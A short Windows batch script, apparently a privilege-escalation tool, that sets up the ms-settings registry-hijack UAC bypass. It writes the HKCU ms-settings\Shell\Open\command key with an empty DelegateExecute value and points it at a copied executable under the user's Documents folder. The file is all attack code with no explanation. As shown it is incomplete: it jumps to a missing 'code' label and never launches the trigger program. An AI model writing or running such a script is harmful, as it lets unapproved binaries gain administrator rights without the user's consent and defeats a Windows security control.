@echo off
openfiles >NUL 2>&1 
if NOT %ERRORLEVEL% EQU 0 goto NotAdmin 
echo Hello, this command prompt is an elevated command prompt (Run as administrator).
goto code

:NotAdmin 
echo Not Admin
goto uac

:uac
set "filepath3=%userprofile%\Documents\1"
set "filepath=%userprofile%\Documents\1\12"
set "filepath2=%userprofile%\Documents\1\12\1.exe"
set "filepath12=%userprofile%\Documents\1\1.exe"

if not exist "%filepath%" (
    mkdir "%filepath%"
)
if not exist "%filepath3%" (
    mkdir "%filepath3%"
)
powershell -Command "New-Item 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Force"
powershell -Command "New-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name 'DelegateExecute' -Value '' -Force"
powershell -Command "if (Test-Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command') { Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name '(default)' -Value '%filepath2%' } else { Write-Host 'Registry path does not exist.' }"
xcopy "%filepath12%" "%filepath%"
exit

